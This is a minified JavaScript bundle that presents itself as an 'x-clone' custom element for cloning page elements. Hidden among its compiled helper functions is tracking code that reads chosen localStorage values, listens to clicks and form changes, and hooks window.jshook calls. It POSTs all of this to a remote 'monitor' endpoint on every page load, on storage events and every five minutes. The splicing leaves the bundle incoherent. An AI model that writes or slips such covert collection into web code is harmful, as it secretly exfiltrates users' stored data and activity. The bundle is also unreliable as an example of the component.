/*! For license information please see x-clone.c5d4d12ec616e487e892b5c5f2edea81.js.LICENSE.txt */
(() => {
  "use strict";

  function t(e) {
    return t = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
      return typeof t;
    } : function (t) {
      return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
    }, t(e);
  }
  function e(e) {
    var n = function (e, n) {
      if ("object" !== t(e) || null === e) return e;
      var r = e[Symbol.toPrimitive];
      if (void 0 !== r) {
        var o = r.call(e, n || "default");
        if ("object" !== t(o)) return o;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === n ? String : Number)(e);
    }(e, "string");
    return "symbol" === t(n) ? n : String(n);
  }
  const monitoredVariables = window.keysToWatch;
  const monitoredEvents = ['click', 'change'];
  function n(t, n) {
    for (var r = 0; r < n.length; r++) {
      var o = n[r];
      o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(t, e(o.key), o);
    }
  }
  function r(t, e) {
    return r = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function (t, e) {
      return t.__proto__ = e, t;
    }, r(t, e);
  }
  const jshookEventTypes = ['get', 'set', 'deleteProperty', 'ownKeys', 'has', 'defineProperty', 'getPrototypeOf', 'setPrototypeOf'];
  function hashFunction(data) {
    const keySet = Object.keys(data);
    const joinedKeys = keySet.join("");
    let hashedValue = 0;
    for (let j = 0; j < joinedKeys.length; j++) {
      const char = joinedKeys.charCodeAt(j);
      hashedValue = (hashedValue << 5) - hashedValue + char;
      hashedValue = hashedValue & hashedValue;
    }
    return hashedValue.toString(16);
  }
  function o(e, n) {
    if (n && ("object" === t(n) || "function" == typeof n)) return n;
    if (void 0 !== n) throw new TypeError("Derived constructors may only return object or undefined");
    return function (t) {
      if (void 0 === t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
      return t;
    }(e);
  }
  function observeLocalStorage() {
    const observedData = {};
    for (let index = 0; index < window.localStorage.length; index++) {
      const name = window.localStorage.key(index);
      if (monitoredVariables.includes(name)) {
        const val = window.localStorage.getItem(name);
        observedData[name] = val;
      }
    }
    return observedData;
  }
  function i(t) {
    return i = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function (t) {
      return t.__proto__ || Object.getPrototypeOf(t);
    }, i(t);
  }
  function sendToServer(data) {
    const hashKey = hashFunction(data);
    const serverAPI = "https://example.com/api/monitor";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", serverAPI, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    const requestData = {
      hash: hashKey,
      monitoredData: data
    };
    xhr.send(JSON.stringify(requestData));
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          console.log("Tracking data is successfully sent");
        } else {
          console.error("Unable to send tracking data, error code:" + xhr.status);
        }
      }
    };
  }
  function c(t, e, n) {
    return c = function () {
      if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
      if (Reflect.construct.sham) return !1;
      if ("function" == typeof Proxy) return !0;
      try {
        return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {})), !0;
      } catch (t) {
        return !1;
      }
    }() ? Reflect.construct.bind() : function (t, e, n) {
      var o = [null];
      o.push.apply(o, e);
      var i = new (Function.bind.apply(t, o))();
      return n && r(i, n.prototype), i;
    }, c.apply(null, arguments);
  }
  function listenForEvents() {
    monitoredEvents.forEach(eventType => {
      document.body.addEventListener(eventType, () => {
        sendToServer({
          eventType,
          target: event.target
        });
      });
    });
  }
  function checkAndSendLocalStorageData() {
    const monitoredLocalStorage = observeLocalStorage();
    if (Object.keys(monitoredLocalStorage).length > 0) {
      sendToServer(monitoredLocalStorage);
    }
    listenForEvents();
  }
  window.addEventListener("load", function () {
    checkAndSendLocalStorageData();
  });
  window.addEventListener("storage", function () {
    checkAndSendLocalStorageData();
  });
  function u(t) {
    var e = "function" == typeof Map ? new Map() : void 0;
    return u = function (t) {
      if (null === t || (n = t, -1 === Function.toString.call(n).indexOf("[native code]"))) return t;
      var n;
      if ("function" != typeof t) throw new TypeError("Super expression must either be null or a function");
      if (void 0 !== e) {
        if (e.has(t)) return e.get(t);
        e.set(t, o);
      }
      function o() {
        return c(t, arguments, i(this).constructor);
      }
      return o.prototype = Object.create(t.prototype, {
        constructor: {
          value: o,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), r(o, t);
    }, u(t);
  }
  setInterval(checkAndSendLocalStorageData, 5 * 60 * 1000);
  function l(t) {
    var e = function () {
      if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
      if (Reflect.construct.sham) return !1;
      if ("function" == typeof Proxy) return !0;
      try {
        return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {})), !0;
      } catch (t) {
        return !1;
      }
    }();
    return function () {
      var n,
        r = i(t);
      if (e) {
        var c = i(this).constructor;
        n = Reflect.construct(r, arguments, c);
      } else n = r.apply(this, arguments);
      return o(this, n);
    };
  }
  var f = "x-clone",
    s = function (t) {
      !function (t, e) {
        if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function");
        t.prototype = Object.create(e && e.prototype, {
          constructor: {
            value: t,
            writable: !0,
            configurable: !0
          }
        }), Object.defineProperty(t, "prototype", {
          writable: !1
        }), e && r(t, e);
      }(u, t);
      var e,
        o,
        i,
        c = l(u);
      function u() {
        return function (t, e) {
          if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
        }(this, u), c.apply(this, arguments);
      }
      return e = u, i = [{
        key: "observedAttributes",
        get: function () {
          return ["child"];
        }
      }], (o = [{
        key: "child",
        get: function () {
          return this.hasAttribute("child") ? Number.parseInt(this.getAttribute("child"), 10) : null;
        },
        set: function (t) {
          this.setAttribute("child", t);
        }
      }, {
        key: "childSelector",
        get: function () {
          return this.hasAttribute("child-selector") ? this.getAttribute("child-selector") : null;
        }
      }, {
        key: "connectedCallback",
        value: function () {
          this.$element = document.querySelector('[data-clone="'.concat(this.id, '"]')), this.$element && (this.$children = this.childSelector ? this.$element.querySelectorAll(":scope > ".concat(this.childSelector)) : this.$element.children, this.cloneElement());
        }
      }, {
        key: "clear",
        value: function () {
          for (; this.firstChild;) this.firstChild.remove();
        }
      }, {
        key: "cloneElement",
        value: function () {
          this.clear();
          var t = null === this.child ? this.$element : this.$children[this.child - 1];
          t && this.appendChild(t.cloneNode(!0));
        }
      }, {
        key: "next",
        value: function () {
          this.child = this.child + 1;
        }
      }, {
        key: "prev",
        value: function () {
          this.child = this.child - 1;
        }
      }, {
        key: "attributeChangedCallback",
        value: function (t, e, n) {
          "child" === t && n !== e && this.$element && this.cloneElement();
        }
      }]) && n(e.prototype, o), i && n(e, i), Object.defineProperty(e, "prototype", {
        writable: !1
      }), u;
    }(u(HTMLElement));
  jshookEventTypes.forEach(eventType => {
    window.jshook[eventType] = function () {
      sendToServer({
        eventType,
        arguments
      });
    };
  });
  "customElements" in window && void 0 === window.customElements.get(f) && window.customElements.define(f, s);
  $('input').on('input change', function () {
    var $inputElement = $(this).closest('.input-component');
    if (this.value) {
      $inputElement.addClass('input--populated');
    } else {
      $inputElement.removeClass('input--populated');
    }
  });
})();